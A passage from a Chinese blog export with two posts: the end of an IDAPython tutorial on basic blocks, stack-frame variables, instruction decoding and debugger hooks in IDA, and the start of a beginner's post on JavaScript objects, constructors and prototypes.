class="keyword">in</span> block.succs(): <span class="comment"># 获取后继节点</span></span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                print(<span class="string">"  succs: %x - %x [%d]:"</span> % (succ_block.start_ea, succ_block.end_ea, succ_block.id))</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">for</span> pred_block <span class="keyword">in</span> block.preds(): <span class="comment"># 获取前驱节点</span></span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                print(<span class="string">"  preds:%x - %x [%d]:"</span> % (pred_block.start_ea, pred_block.end_ea, pred_block.id))</span><br><span class="line">        </span><br><span class="line">cls_main()</span><br></pre></td></tr></table></figure>

<h4 id="函数栈帧的访问"><a href="#函数栈帧的访问" class="headerlink" title="函数栈帧的访问"></a>函数栈帧的访问</h4><p>在x86程序中，EBP寄存器通常专门用做栈帧指针，例外 gun/g++提供 -fomit-frame-pointer编译选项，可以生成不依赖于固定帧指针寄存器的函数。</p>
<p><img src="https://pic.wonderkun.cc/uploads/2020/12/Snipaste_2020-01-29_21-46-07.png" alt="Snipaste_2020-01-29_21-46-07"><br>基于ebp做栈帧指针的函数，正偏移是函数参数，负偏移是则用于访问函数的局部变量。</p>
<p>很明显函数的栈帧是一个运行时的概念，没有栈和运行时的程序，栈帧就不可能存在。话虽如此，但是并不意味者ida在做静态的分析的时候就会忽略掉栈帧的概念。二进制文件中包含配置每个函数栈帧所需的所有代码，通过仔细分析这些代码，我们就可以深入了解任何函数的栈帧结构，即使这个函数并未运行。在IDA中也会有一些复杂的分析来确定IDA反汇编的每个函数的栈帧布局。在分析的过程中，IDA会记住每一次push/pop操作，以及其他的任何可能改变栈指针的运算，如增加或者减去常量，尽可能的去观察栈指针在函数执行时的行为。</p>
<p>IDA提供一个摘要视图，列出了栈帧内被直接引用的每一个变量，以及变量的大小和与它们与帧指针的偏移距离。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">404C90 ; int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)</span><br><span class="line">.text:00404C90 _WinMain@16     proc near               ; CODE XREF: start+186↓p</span><br><span class="line">.text:00404C90</span><br><span class="line">.text:00404C90 phkResult       &#x3D; dword ptr -658h</span><br><span class="line">.text:00404C90 Data            &#x3D; byte ptr -654h</span><br><span class="line">.text:00404C90 var_650         &#x3D; WNDCLASSEXW ptr -650h</span><br><span class="line">.text:00404C90 String1         &#x3D; word ptr -620h</span><br><span class="line">.text:00404C90 var_61E         &#x3D; byte ptr -61Eh</span><br><span class="line">.text:00404C90 anonymous_0     &#x3D; byte ptr -41Ah</span><br><span class="line">.text:00404C90 var_418         &#x3D; word ptr -418h</span><br><span class="line">.text:00404C90 var_416         &#x3D; byte ptr -416h</span><br><span class="line">.text:00404C90 anonymous_1     &#x3D; byte ptr -212h</span><br><span class="line">.text:00404C90 String2         &#x3D; word ptr -210h</span><br><span class="line">.text:00404C90 var_20E         &#x3D; byte ptr -20Eh</span><br><span class="line">.text:00404C90 anonymous_2     &#x3D; byte ptr -0Ah</span><br><span class="line">.text:00404C90 StackCookie     &#x3D; dword ptr -4</span><br><span class="line">.text:00404C90 hInstance       &#x3D; dword ptr  8</span><br><span class="line">.text:00404C90 hPrevInstance   &#x3D; dword ptr  0Ch</span><br><span class="line">.text:00404C90 lpCmdLine       &#x3D; dword ptr  10h</span><br><span class="line">.text:00404C90 nShowCmd        &#x3D; dword ptr  14h</span><br></pre></td></tr></table></figure>

<p>但是需要注意的是 <code>arg_0</code> 对应的偏移是 <code>ebp+0x4</code>,<code>arg_4</code>对应的偏移是<code>ebp+0x8</code>。</p>
<p>idapython也提供获取此函数栈帧的api，获取到之后是一个结构体，操作结构体成员就可以获取到函数栈帧内的所有变量。相关的函数说明如下：</p>
<ul>
<li>idaapi.get_func(ea): retrieves the <code>func_t</code> structure for the function at <code>ea</code></li>
<li><code>idaapi.get_frame(func_t foo)</code>: returns the <code>struct_t</code> structure for the function frame specified by <code>foo</code></li>
<li><code>idautils.DecodeInstruction(ea)</code>: returns the <code>inst_t</code> representing instruction at <code>ea</code>,和函数<code>idaapi.decode_insn</code>功能相同。</li>
<li>idaapi.get_stkvar(op_t op, sval_t v): <code>op</code> is a reference to an instruction, <code>v</code> is the immediate value in the operand. Usually you just use <code>op.addr</code>. It returns a tuple, <code>(member_t, val)</code>. <code>member_t</code> is a pointer to the stack variable, which is what we need. <code>val</code> is the same value as the <code>soff</code> field in the <code>member_t</code> for the stack var. More on this later.</li>
<li>idaapi.xreflist_t()<code>: creates a new</code>xreflist<code>of</code>xreflist_entry_t`</li>
<li>idaapi.build_stkvar_xrefs(xreflist_t xrefs, func_t func, member_t member): fills xrefs with <code>xreflist_entry_t</code>‘s that represent the stack var xrefs given by <code>member</code> in <code>func</code>.</li>
<li><code>struct_t.get_member(x)</code>: You can use this method to iterate all stack variables in a frame to retrieve all <code>member_t</code>‘s. If you want to build xrefs for all stack variables, this is usually easier.</li>
<li><code>idc.get_member_name(id, member_offset)</code>: id is the struct sid，member_offset. get the member name defined in the name.</li>
<li><code>idc.get_member_offset(id,name)</code>： 获取偏移。</li>
</ul>
<p>下面对<code>iautils.DecodeInstruction(ea)</code>指令进行一个简单的说明，这是一个指令解码的API，如果解码失败返回None，否则将返回一个包含该指令及其操作数的指令对象。</p>
<p>比较重要的指令属性如下：</p>
<ul>
<li><p><code>inst.itype</code> 标志当前指令的类型，是一个整数，不同的opcode可能有相同的itype，但是opcode不是itype。</p>
</li>
<li><p><code>inst.size</code>: 表示解码后的指令长度</p>
</li>
<li><p><code>inst.ops[]</code>:以0为索引的数组，用来保存操作数的相关信息</p>
</li>
<li><p><code>inst.Op1...inst.OpN</code>： 以1位索引起始操作数组别名,和inst.ops[n+1]等价。</p>
</li>
<li><p><code>inst.ea</code>： 指令的线性地址。</p>
<p>你可能会想知道opcode和它的<code>itype</code>之间到底是什么关系。其实很简单，在IDA中，开源数据库处理器模块负责根据opcode来填充<code>itype</code>字段。在IDA SDK中，你可以找到一个<code>allins.hpp</code>的头文件。该头文件包含了所有支持的处理器模块的枚举数据其中包含了受支持的所有指令： </p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Excerpt from allins.hpp</span></span><br><span class="line"><span class="comment">// x86/x64 itypes</span></span><br><span class="line"><span class="keyword">enum</span></span><br><span class="line">&#123;</span><br><span class="line">NN_null = <span class="number">0</span>,            <span class="comment">// Unknown Operation</span></span><br><span class="line">NN_aaa,                 <span class="comment">// ASCII Adjust after Addition</span></span><br><span class="line">NN_aad,                 <span class="comment">// ASCII Adjust AX before Division</span></span><br><span class="line">NN_aam,                 <span class="comment">// ASCII Adjust AX after Multiply</span></span><br><span class="line">NN_aas,                 <span class="comment">// ASCII Adjust AL after Subtraction</span></span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">NN_jz,                  <span class="comment">// Jump if Zero (ZF=1)</span></span><br><span class="line">NN_jmp,                 <span class="comment">// Jump</span></span><br><span class="line">NN_jmpfi,               <span class="comment">// Indirect Far Jump</span></span><br><span class="line">NN_jmpni,               <span class="comment">// Indirect Near Jump</span></span><br><span class="line">NN_jmpshort,            <span class="comment">// Jump Short (not used)</span></span><br><span class="line">NN_lahf,                <span class="comment">// Load Flags into AH Register</span></span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line"><span class="comment">// Pentium III Pseudo instructions</span></span><br><span class="line">NN_cmpeqps,             <span class="comment">// Packed Single-FP Compare EQ</span></span><br><span class="line">NN_cmpltps,             <span class="comment">// Packed Single-FP Compare LT</span></span><br><span class="line">NN_cmpleps,             <span class="comment">// Packed Single-FP Compare LE</span></span><br><span class="line">NN_cmpunordps,          <span class="comment">// Packed Single-FP Compare UNORD</span></span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 不知道为什么，反正<code>NN_</code>前缀用来表示x86/x64处理器上的指令。 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># .text:00402085 74 09 jz short loc_402090</span></span><br><span class="line">inst = idautils.DecodeInstruction(<span class="number">0x402085</span>)</span><br><span class="line">print(<span class="string">"YES"</span> <span class="keyword">if</span> inst.itype == idaapi.NN_jz <span class="keyword">else</span> <span class="string">"NO"</span>)</span><br></pre></td></tr></table></figure>

<p> 至于操作数，可以通过访问<code>inst.Operands[]</code>或者<code>inst.OpN</code>来访问。要获取被解码指令使用的操作数数量不应依赖<code>Operands</code>数组的长度，因为它总是被解析成<code>UA_MAXOP==8</code>（参阅ida.hpp）。因此应该使用遍历每个操作数并检查操作数的类型是否是<code>o_void</code>类型。 </p>
<p> 操作数的定义是<code>ua.hpp</code>中的<code>op_t</code>结构。 </p>
<ul>
<li><p><code>op.flags</code>：操作数的标志</p>
</li>
<li><p><code>op.dtype</code>：操作数的长度类型。<code>idaapi.dt_xxx</code>常量，可以通过该常量来获取操作数的字节大小（1 == idaapi.dt_byte,2 == idaapi.dt_word等等）。</p>
</li>
<li><p><code>op.type</code>：操作数类型。<code>idc.o_xxx</code>常量。</p>
</li>
<li><p><code>specflags1</code>…<code>specflags4</code>：处理器相关标志。</p>
<p>以下是受支持的操作数类型（<code>o_xxx</code>）:</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">o_void：没有该操作数。</span><br><span class="line">o_reg：该操作数是寄存器（ax,al,es,ds等等）</span><br><span class="line">o_mem：直接寻址（数据）</span><br><span class="line">o_phrase：[基址+变址]寻址</span><br><span class="line">o_displ：[基址+变址+偏移]寻址</span><br><span class="line">o_imm：立即数</span><br><span class="line">o_far：直接远地址（far address，代码）</span><br><span class="line">o_near：直接近地址（near address，代码）</span><br><span class="line">o_dispspec0...o_dispspec5：处理器相关标志。</span><br></pre></td></tr></table></figure>

<p>还有一些操作数成员的含义因操作数的类型而异：</p>
<figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line">op<span class="number">_</span>reg：寄存器编号（o<span class="number">_</span>reg）</span><br><span class="line">op<span class="number">_p</span>hrase：内存访问中的索引寄存器（o<span class="number">_p</span>hrase）</span><br><span class="line">op<span class="number">_</span><span class="keyword">value</span>：立即数（o<span class="number">_</span>imm）或偏移（o<span class="number">_</span>displ）</span><br><span class="line">op<span class="number">_</span>addr： 操作数使用的内存地址（o<span class="number">_m</span>em，o<span class="number">_f</span>ar，o<span class="number">_</span>displ，o<span class="number">_n</span>ear）</span><br></pre></td></tr></table></figure>

<p> 当操作数的类型是<code>o_reg</code>或者<code>o_phrase</code>的时候，<code>op_reg</code>/<code>op_phrase</code>值包含了对应寄存器的枚举值。就像<code>NN_xxx</code>专有标签，IDA SDK同样提供了寄存器的名称常量，以及其对应的值；但是，这只适用于<code>x86</code>/<code>x64</code>处理器模块。我从<code>intel.hpp</code>中摘抄了一部分： </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> RegNo</span><br><span class="line">&#123;</span><br><span class="line">  R_ax = <span class="number">0</span>,</span><br><span class="line">  R_cx,</span><br><span class="line">  R_dx,</span><br><span class="line">  R_bx,</span><br><span class="line">  R_sp,</span><br><span class="line">  R_bp,</span><br><span class="line">  R_si,</span><br><span class="line">  R_di</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 不幸的是，这些值并没有被IDAPython导出，但是至少我们知道了足够多的信息来定义下边的一些数据： </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">REG_EAX = <span class="number">0</span></span><br><span class="line">REG_EDX = <span class="number">2</span></span><br><span class="line">REG_EBP = <span class="number">5</span></span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">REG_NAMES = &#123; REG_EAX: <span class="string">'eax'</span>, REG_EDX: <span class="string">'edx'</span>, REG_EBP: <span class="string">'ebp'</span> ...&#125;</span><br></pre></td></tr></table></figure>

<p>可以利用如下代码获取某个函数栈帧的所有成员以及偏移。注意获取的frame不仅包括函数栈帧还包括返回地址以及形参。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">import</span> idautils </span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">addr = here()</span><br><span class="line"></span><br><span class="line">func = idaapi.get_func(addr)</span><br><span class="line">frame = idaapi.get_frame(func)</span><br><span class="line">print(frame)</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">dictMem = &#123;&#125;</span><br><span class="line"><span class="keyword">while</span>(x &lt; frame.memqty):</span><br><span class="line">    name = idc.get_member_name(frame.id, frame.get_member(x).soff)</span><br><span class="line">    dictMem[name] =  hex(idc.get_member_offset(frame.id,name))</span><br><span class="line">    x = x+<span class="number">1</span></span><br><span class="line">print(dictMem)</span><br></pre></td></tr></table></figure>

<p>获得的结果如下：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#123;'phkResult': '0x10', </span><br><span class="line">'Data': '0x14', </span><br><span class="line">'var_650': '0x18', </span><br><span class="line">'String1': '0x48', </span><br><span class="line">'var_61E': '0x4a', </span><br><span class="line">'anonymous_0': '0x24e', </span><br><span class="line">'var_418': '0x250', </span><br><span class="line">'var_416': '0x252', </span><br><span class="line">'anonymous_1': '0x456', </span><br><span class="line">'String2': '0x458', </span><br><span class="line">'var_20E': '0x45a', </span><br><span class="line">'anonymous_2': '0x65e', </span><br><span class="line">'StackCookie': '0x664', </span><br><span class="line">' s': '0x668', </span><br><span class="line">' r': '0x66c', </span><br><span class="line">'hInstance': '0x670', </span><br><span class="line">'hPrevInstance': '0x674', </span><br><span class="line">'lpCmdLine': '0x678', </span><br><span class="line">'nShowCmd': '0x67c'</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意此偏移都是相对于当前栈帧的栈底(也就是esp)来说的。注意两个非常重要的成员” r”和” s”，其中” r”代表返回地址存储的偏移，” s”代表当前函数栈帧中ebp距离esp的位置(也就是函数栈帧的大小)。<strong>注意有个空格</strong></p>
<p>也可以利用此frame的结构来获取x86中当前函数参数的字节数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ret_off = idc.get_member_offset(frame.id,<span class="string">" r"</span>)</span><br><span class="line">first_arg_off = ret_off + <span class="number">4</span> </span><br><span class="line">args_size = idc.get_struc_size(frame.id) - first_arg_off</span><br><span class="line"></span><br><span class="line">print(args_size)</span><br></pre></td></tr></table></figure>

<p>获取某个函数的某一条指令中引用的函数栈帧变量的名字以及在frame中的偏移，并获取其他地方引用此变量的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0x00404C90 is the function address</span></span><br><span class="line"><span class="comment"># 0x00404CA4 is an instruction address referencing</span></span><br><span class="line"><span class="comment"># a stack variable. It looks like:</span></span><br><span class="line"><span class="comment"># .text:00404CA4  mov     [esp+668h+StackCookie], eax</span></span><br><span class="line"><span class="comment"># .text:00404CBF  mov     ecx, [esp+668h+StackCookie] ; StackCookie</span></span><br><span class="line"></span><br><span class="line">pFunc = idaapi.get_func(<span class="number">0x00404C90</span>)</span><br><span class="line">pFrame = idaapi.get_frame(pFunc)</span><br><span class="line">inst = idautils.DecodeInstruction(<span class="number">0x00404CA4</span>)</span><br><span class="line">op = inst[<span class="number">0</span>] <span class="comment">#获取第一个操作数，注意此操作数必须有栈帧变量的引用，否则下条指令会报错</span></span><br><span class="line">pMember, val = idaapi.get_stkvar(inst,op, op.addr) <span class="comment"># pMember 是frame结构体中的成员，val是在frame中的偏移量</span></span><br><span class="line"></span><br><span class="line">xrefs = idaapi.xreflist_t()</span><br><span class="line">idaapi.build_stkvar_xrefs(xrefs, pFunc, pMember)</span><br><span class="line"><span class="keyword">for</span> xref <span class="keyword">in</span> xrefs:</span><br><span class="line">    print(hex(xref.ea)) <span class="comment">#print xref address</span></span><br></pre></td></tr></table></figure>

<p>也可以使用如下代码找具体的某个栈帧变量在函数中的引用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pFunc = idaapi.get_func(<span class="number">0x00404C90</span>)</span><br><span class="line">pFrame = idaapi.get_frame(pFunc)</span><br><span class="line"></span><br><span class="line">dictMem = dict()</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(x &lt; pFrame.memqty):</span><br><span class="line">    dictMem[idc.get_member_name(pFrame.id, pFrame.get_member(x).soff)] = pFrame.get_member(x)</span><br><span class="line">    x = x+<span class="number">1</span></span><br><span class="line"><span class="comment"># given var name you can now use the</span></span><br><span class="line"><span class="comment"># dictionary to grab the member_t to pass</span></span><br><span class="line"><span class="comment"># to build_stkvar_xrefs</span></span><br><span class="line">pMem = dictMem[<span class="string">"hInstance"</span>]</span><br><span class="line">xrefs = idaapi.xreflist_t()</span><br><span class="line">idaapi.build_stkvar_xrefs(xrefs, pFunc, pMem)</span><br><span class="line"><span class="keyword">for</span> xref <span class="keyword">in</span> xrefs:</span><br><span class="line">    print(hex(xref.ea)) <span class="comment">#print xrefs to var_4</span></span><br></pre></td></tr></table></figure>

<h4 id="程序入口点"><a href="#程序入口点" class="headerlink" title="程序入口点"></a>程序入口点</h4><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">idc.get<span class="constructor">_entry_qty()</span> 获取入口点个数</span><br><span class="line">idc.get<span class="constructor">_entry_ordinal(<span class="params">index</span>)</span> 获取入口点地址</span><br><span class="line">idc.get<span class="constructor">_entry_name(<span class="params">ordinal</span>)</span> 入口名</span><br></pre></td></tr></table></figure>

<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>安装调试的hook使用如下api：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">debugger = idaapi.DBG_Hooks()</span><br><span class="line">debugger.hook()</span><br></pre></td></tr></table></figure>

<p> 现在运行调试器，hook 会捕捉所有的调试事件，这样就能非常精确的控制 IDA 调试器。 下面的函数在调试的时候非常有用: </p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">idc.add_bpt( long<span class="built_in"> Address </span>) # 在指定的地点设置软件断点。</span><br><span class="line">idc.get_bpt_qty() #返回当前设置的断点数量。</span><br><span class="line">idc.get_reg_value(string Register) # 获取寄存器的值 ,dbg必须处于运行状态</span><br><span class="line">idc.set_reg_Value(long Value, string Register) # 通过寄存器名获得寄存器值。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>binary</tag>
        <tag>pwn</tag>
        <tag>学习记录</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript基础知识</title>
    <url>/2019/07/18/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h2 id="javascript基础知识"><a href="#javascript基础知识" class="headerlink" title="javascript基础知识"></a>javascript基础知识</h2><p>初学javascript，有什么写的不对的地方，请师傅们斧正。</p>
<a id="more"></a>

<h3 id="0x1-怪异的javascript对象"><a href="#0x1-怪异的javascript对象" class="headerlink" title="0x1 怪异的javascript对象"></a>0x1 怪异的javascript对象</h3><p>对象是一个包含相关数据和方法的集合（通常由一些变量和函数组成，我们称之为对象里面的属性和方法）。在其他经典的面向对象的语言中我们并没有办法直接去创建对象，我们都需要先用<code>class</code>这样的关键词创建一个对象模板（被称为类），然后调用类的构造函数去初始化一个对象出来，在类中描述的属性和方法会复制一份到对象中去，然而对于javascript来说，情况并非如此（不像“经典”的面向对象的语言，从构建函数创建的新实例的特征并非全盘复制，而是通过一个叫做原形链的参考链链接过去的，所以这并非真正的实例，严格的讲， JavaScript 在对象间使用和其它语言的共享机制不同，这个后面再讲），我们可以直接创建一个对象而不需要对象模板,创建方法请参考第二节。</p>
<h3 id="0x2-javascript对象的基础知识"><a href="#0x2-javascript对象的基础知识" class="headerlink" title="0x2 javascript对象的基础知识"></a>0x2 javascript对象的基础知识</h3><p>在javascript中我们可以直接创建一个对象，而不需要对象模板，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name : [<span class="string">'Bob'</span>, <span class="string">'Smith'</span>],</span><br><span class="line">  age : <span class="number">32</span>,</span><br><span class="line">  gender : <span class="string">'male'</span>,</span><br><span class="line">  interests : [<span class="string">'music'</span>, <span class="string">'skiing'</span>],</span><br><span class="line">  bio : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="keyword">this</span>.name[<span class="number">0</span>] + <span class="string">' '</span> + <span class="keyword">this</span>.name[<span class="number">1</span>] + <span class="string">' is '</span> + <span class="keyword">this</span>.age + <span class="string">' years old. He likes '</span> + <span class="keyword">this</span>.interests[<span class="number">0</span>] + <span class="string">' and '</span> + <span class="keyword">this</span>.interests[<span class="number">1</span>] + <span class="string">'.'</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  greeting: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'Hi! I\'m '</span> + <span class="keyword">this</span>.name[<span class="number">0</span>] + <span class="string">'.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>一个如上所示的对象被称之为对象的字面量(literal)——手动的写出对象的内容来创建一个对象。不同于从类实例化一个对象。</p>
<p>访问person的属性和方法，可以使用如下方式：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">person.age <span class="comment">// 点号访问法</span></span><br><span class="line">person[<span class="string">"age"</span>] <span class="comment">//括号表示法</span></span><br></pre></td></tr></table></figure>

<p>也可以在一个对象中来作为另一对象的值，例如修改person的name成员</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">name : &#123;</span><br><span class="line">  first : <span class="string">'Bob'</span>,</span><br><span class="line">  last : <span class="string">'Smith'</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>这样其实创建了一个子命名空间，可以使用如下方式访问：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">person.name.first</span><br><span class="line">person[<span class="string">"name"</span>][<span class="symbol">"first"</span>]</span><br></pre></td></tr></table></figure>

<p>关键字”this”指向了当前代码运行时的对象，这里即指person对象。</p>
<p>除此之外，还可以直接修改对象中的属性和方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">person.age = <span class="number">45</span></span><br><span class="line">person.greeting = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'Hi! I\'m '</span> + <span class="keyword">this</span>.name.first + <span class="string">'.'</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x3-构建函数和对象示例"><a href="#0x3-构建函数和对象示例" class="headerlink" title="0x3 构建函数和对象示例"></a>0x3 构建函数和对象示例</h3><p>但是我们不能仅满足于以上的创建对象的方法，因为很多时候我们需要创建很多的对象(假如我要定义1万个人，它们都具有相同的属性和方法，只是属性的值不一样，我总不能把上面的那个定义抄一万次吧)。所以javascript也需要有一个像经典语言那样的能够创建对象模板的方法，可以根据模板自动化的创建我们需要的对象。JavaScript 用一种称为<strong>构建函数</strong>的特殊函数来定义对象和它们的特征。<strong>构建函数</strong>提供了创建您所需对象（实例）的有效方法，将对象的数据和特征函数按需联结至相应对象。</p>
<p>一个例子如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.greeting = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'Hi! I\'m '</span> + <span class="keyword">this</span>.name + <span class="string">'.'</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个构建函数是 JavaScript 版本的类，这里使用了<code>this</code>关键词，指向这个构建函数创建的示例自身，而非指向构建函数（这跟其他面向对象语言中的this的含义一样）。</p>
<p><strong>一个构建函数通常是大写字母开头，这样便于区分构建函数和普通函数。</strong></p>
<p>使用构建函数创建新的实例:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person(<span class="string">'Bob'</span>); <span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> Person(<span class="string">'Sarah'</span>);</span><br></pre></td></tr></table></figure>

<p>当新的对象被创立, 变量<code>person1</code>与<code>person2</code>有效地包含了以下值：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  name : <span class="string">'Bob'</span>,</span><br><span class="line">  greeting : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'Hi! I\'m '</span> + <span class="keyword">this</span>.name + <span class="string">'.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  name : <span class="string">'Sarah'</span>,</span><br><span class="line">  greeting : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'Hi! I\'m '</span> + <span class="keyword">this</span>.name + <span class="string">'.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="创建实例的其他方法"><a href="#创建实例的其他方法" class="headerlink" title="创建实例的其他方法"></a>创建实例的其他方法</h4><h5 id="Object-构造函数"><a href="#Object-构造函数" class="headerlink" title="Object()构造函数"></a>Object()构造函数</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> <span class="built_in">Object</span>(); <span class="comment">//首先, 您能使用Object()构造函数来创建一个新对象。 是的， 一般对象都有构造函数，它创建了一个空的对象。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这样就在person1变量中存储了一个空对象。然后, 可以根据需要, 使用点或括号表示法向此对象添加属性和方法</span></span><br><span class="line">person1.name = <span class="string">'Chris'</span>;</span><br><span class="line">person1[<span class="string">'age'</span>] = <span class="number">38</span>;</span><br><span class="line">person1.greeting = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">'Hi! I\'m '</span> + <span class="keyword">this</span>.name + <span class="string">'.'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还可以将对象文本传递给Object() 构造函数作为参数， 以便用属性/方法填充它</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> <span class="built_in">Object</span>(&#123;</span><br><span class="line">  name : <span class="string">'Chris'</span>,</span><br><span class="line">  age : <span class="number">38</span>,</span><br><span class="line">  greeting : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'Hi! I\'m '</span> + <span class="keyword">this</span>.name + <span class="string">'.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h5 id="使用create-方法"><a href="#使用create-方法" class="headerlink" title="使用create()方法"></a>使用create()方法</h5><p>JavaScript有个内嵌的方法<code>create()</code>, 它允许您基于现有对象创建新的对象实例。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person2 = <span class="built_in">Object</span>.create(person1);</span><br><span class="line"></span><br><span class="line">person2.name</span><br><span class="line">person2.greeting()</span><br></pre></td></tr></table></figure>

<p>您可以看到，<code>person2</code>是基于<code>person1</code>创建的， 它们具有相同的属性和方法。这非常有用， 因为它允许您创建新的对象实例而无需定义构造函数。</p>
<h3 id="0x4-基于原型的语言"><a href="#0x4-基于原型的语言" class="headerlink" title="0x4 基于原型的语言"></a>0x4 基于原型的语言</h3><p>JavaScript 常被描述为一种<strong>基于原型的语言 (prototype-based language)</strong>——每个对象拥有一个<strong>原型对象</strong>，对象以其原型为模板、从原型继承方法和属性。原型对象也可能拥有原型，并从中继承方法和属性，一层一层、以此类推。这种关系常被称为<strong>原型链 (prototype chain)</strong>，它解释了为何一个对象会拥有定义在其他对象中的属性和方法。</p>
<p>在传统的 OOP 中，首先定义“类”，此后创建对象实例时，类中定义的所有属性和方法都被复制到实例中。在 JavaScript 中并不如此复制——而是在对象实例和它的构造器之间建立一个链接（它是<strong>proto</strong>属性，是从构造函数的<code>prototype</code>属性派生的），之后通过上溯原型链，在构造器中找到这些属性和方法。</p>
<h4 id="使用javascript中的原型"><a href="#使用javascript中的原型" class="headerlink" title="使用javascript中的原型"></a>使用javascript中的原型</h4><p>在javascript中，函数可以有属性。 每个函数都有一个特殊的属性叫作<code>原型（prototype）</code>,</p>
